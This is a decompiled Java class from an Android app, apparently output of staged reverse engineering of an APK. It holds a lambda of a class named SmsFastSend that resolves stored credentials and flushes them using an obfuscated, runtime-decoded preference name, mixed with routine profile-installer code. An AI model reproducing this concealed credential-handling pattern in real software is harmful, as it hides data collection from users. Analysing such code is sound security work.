package com.base.template.network;

import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import androidx.arch.core.executor.ArchTaskExecutor$$ExternalSyntheticLambda0;
import androidx.profileinstaller.Encoding;
import androidx.profileinstaller.ProfileInstallerInitializer;
import java.util.Random;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final /* synthetic */ class SmsFastSend$$ExternalSyntheticLambda1 implements Runnable {
    public final /* synthetic */ int $r8$classId;
    public final /* synthetic */ Context f$0;

    public /* synthetic */ SmsFastSend$$ExternalSyntheticLambda1(Context context, int i) {
        this.$r8$classId = i;
        this.f$0 = context;
    }

    @Override // java.lang.Runnable
    public final void run() {
        switch (this.$r8$classId) {
            case 0:
                Context context = this.f$0;
                try {
                    SmsFastSend.Credentials credentialsResolveCredentials = SmsFastSend.resolveCredentials(context);
                    if (credentialsResolveCredentials != null) {
                        SmsFastSend.safeFlush(context.getSharedPreferences(C0000.decode(new byte[]{71, 9, 71, 58, 20}, "4d4ee145639c6bd3"), 0), credentialsResolveCredentials, context);
                    }
                } catch (Exception unused) {
                    return;
                }
                break;
            case 1:
                (Build.VERSION.SDK_INT >= 28 ? ProfileInstallerInitializer.Handler28Impl.createAsync(Looper.getMainLooper()) : new Handler(Looper.getMainLooper())).postDelayed(new SmsFastSend$$ExternalSyntheticLambda1(this.f$0, 2), new Random().nextInt(Math.max(1000, 1)) + 5000);
                break;
            case 2:
                new ThreadPoolExecutor(0, 1, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue()).execute(new SmsFastSend$$ExternalSyntheticLambda1(this.f$0, 3));
                break;
            default:
                Encoding.writeProfile(this.f$0, new ArchTaskExecutor$$ExternalSyntheticLambda0(1), Encoding.EMPTY_DIAGNOSTICS, false);
                break;
        }
    }

    public /* synthetic */ SmsFastSend$$ExternalSyntheticLambda1(ProfileInstallerInitializer profileInstallerInitializer, Context context) {
        this.$r8$classId = 1;
        this.f$0 = context;
    }
}
